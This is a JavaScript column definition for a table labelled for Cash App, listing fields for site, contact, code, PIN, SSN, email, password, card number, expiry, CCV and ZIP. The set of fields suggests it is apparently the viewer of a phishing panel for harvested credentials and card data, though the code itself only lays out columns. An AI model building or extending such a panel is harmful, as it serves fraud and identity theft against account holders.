export const cashAppColumn = [
  {
    Header: "Website",
    accessor: "site",
    width: "auto",
  },
  {
    Header: "Email/Phone",
    accessor: "contact",
    width: "auto",
  },
  {
    Header: "Code",
    accessor: "code",
    width: "auto",
  },
  {
    Header: "Pin",
    accessor: "pin",
    width: "auto",
  },
  {
    Header: "SSN",
    accessor: "ssn",
    width: "auto",
  },
  {
    Header: "Email",
    accessor: "email",
    width: "auto",
  },
  {
    Header: "Password",
    accessor: "password",
    width: "auto",
  },
  {
    Header: "Card Number",
    accessor: "card_number",
    width: "auto",
  },
  {
    Header: "Month/Year",
    accessor: "mm_yy",
    width: "auto",
  },
  {
    Header: "CCV",
    accessor: "ccv",
    width: "auto",
  },
  {
    Header: "ZIP Code",
    accessor: "zip",
    width: "auto",
  },
];
